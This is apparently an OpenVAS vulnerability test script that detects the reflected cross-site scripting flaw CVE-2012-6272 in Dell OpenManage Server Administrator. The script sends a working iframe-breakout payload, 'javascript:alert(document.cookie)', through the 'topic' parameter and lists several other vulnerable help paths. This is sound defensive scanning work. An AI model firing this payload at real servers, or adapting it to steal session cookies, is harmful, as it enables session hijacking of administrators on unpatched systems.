##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_dell_omsa_mult_xss_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# Dell OpenManage Server Administrator Multiple XSS Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902941");
  script_version("$Revision: 11401 $");
  script_cve_id("CVE-2012-6272");
  script_bugtraq_id(57212);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-01-30 15:21:55 +0530 (Wed, 30 Jan 2013)");
  script_name("Dell OpenManage Server Administrator Multiple XSS Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/51764");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/950172");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/81158");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 1311);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencies("find_service.nasl", "http_version.nasl");

  script_tag(name:"insight", value:"Input passed via the 'topic' parameter to

  - /help/sm/es/Output/wwhelp/wwhimpl/js/html/index_main.htm,

  - /help/sm/ja/Output/wwhelp/wwhimpl/js/html/index_main.htm,

  - /help/sm/de/Output/wwhelp/wwhimpl/js/html/index_main.htm,

  - /help/sm/fr/Output/wwhelp/wwhimpl/js/html/index_main.htm,

  - /help/sm/zh/Output/wwhelp/wwhimpl/js/html/index_main.htm,

  - /help/hip/en/msgguide/wwhelp/wwhimpl/js/html/index_main.htm and

  - /help/hip/en/msgguide/wwhelp/wwhimpl/common/html/index_main.htm is not
  properly sanitized before being returned to the user.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Dell OpenManage Server Administrator and is
  prone to multiple cross site scripting vulnerabilities.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a user's browser session in context of an
  affected site.");
  script_tag(name:"affected", value:"Dell OpenManage Server Administrator version 6.5.0.1, 7.0.0.1
  and 7.1.0.1");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:1311);

req = http_get(item:"/servlet/OMSALogin?msgStatus=null", port:port);
res = http_keepalive_send_recv(port:port, data:req);

if(res && res =~ "HTTP/1.. 200 OK" && ">Dell OpenManage <" >< res)
{
  url = '/help/sm/en/Output/wwhelp/wwhimpl/js/html/index_main.htm?topic="><' +
        '/iframe><iframe src="javascript:alert(document.cookie)';

  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  if(res && res =~ "HTTP/1.. 200 OK" &&
     "javascript:alert(document.cookie)" >< res && "OMSS_Help" >< res){
    security_message(port:port);
    exit(0);
  }
}

exit(99);
